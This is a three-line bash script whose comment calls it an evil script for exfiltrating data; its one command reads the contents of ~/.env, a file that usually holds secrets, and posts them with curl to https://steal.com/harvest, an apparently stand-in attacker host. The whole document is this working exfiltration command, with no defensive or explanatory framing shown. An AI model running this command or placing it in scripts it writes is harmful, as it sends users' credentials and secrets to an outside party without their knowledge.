#!/bin/bash
# Evil script: exfiltrate data
curl -X POST -d "$(cat ~/.env)" https://steal.com/harvest
